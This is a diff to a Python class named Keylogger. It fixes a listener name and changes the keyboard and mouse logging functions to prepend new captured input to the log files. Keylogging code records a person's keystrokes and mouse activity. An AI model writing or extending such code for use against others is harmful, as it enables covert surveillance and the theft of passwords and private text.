@@ -49,7 +49,7 @@ class Keylogger:
 
 	def start_keyboard_listener(self):
 		# Collect events until released
-		with keyboardListener(
+		with KeyboardListener(
 			on_press = self.on_press,
 			on_release = self.on_release
 			) as keyboardListener:
@@ -74,11 +74,29 @@ class Keylogger:
 		pass
 
 	def write_mouse_log(self, mouse_log_filename, input):
-		with open(mouse_log_filename, "a+") as mouse_log:
-			mouse_log.write(input)
+		temp=''
+		try:
+			old_log_file = open(mouse_log_filename, 'r')
+			temp = old_log_file.read()
+			old_log_file.close()
+		except FileNotFoundError:
+			pass
+		finally:
+			new_log_file = open(mouse_log_filename, "w")
+			new_log_file.seek(0)
+			new_log_file.write(input+temp)
 		return True
 
 	def write_keyboard_log(self, keyboard_log_filename, input):
-		with open(keyboard_log_filename, "a+") as keyboard_log:
-			keyboard_log.write(input)
+		temp=''
+		try:
+			old_data_file = open(keyboard_log_filename, 'r+')
+			temp = old_data_file.read()
+			old_data_file.close()
+		except FileNotFoundError:
+			pass
+		finally:
+			new_log_file = open(keyboard_log_filename, "w+")
+			new_log_file.seek(0)
+			new_log_file.write(input+temp)
 		return True
